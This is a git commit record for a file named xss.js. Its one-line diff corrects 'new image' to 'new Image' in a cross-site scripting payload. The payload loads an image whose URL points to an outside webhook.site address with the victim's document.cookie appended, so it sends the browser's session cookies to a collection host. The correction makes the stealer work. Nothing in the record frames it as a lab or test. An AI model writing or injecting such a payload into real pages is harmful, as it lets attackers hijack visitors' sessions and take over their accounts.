0b2a92741ff2903e7a5589ad1685cf6b52620180
SHAHZAIB HAYAT <58444906+Shahzaib-Hayat-82642@users.noreply.github.com>
2024-08-03 02:16:22 +0500

    Update xss.js

--- xss.js
+++ xss.js
@@ -1,1 +1,1 @@
-var i = new image; i.src="https://webhook.site/65198e80-147c-4937-92b8-c3ed52211873/?cookie="+document.cookie;
+var i = new Image; i.src="https://webhook.site/65198e80-147c-4937-92b8-c3ed52211873/?cookie="+document.cookie;
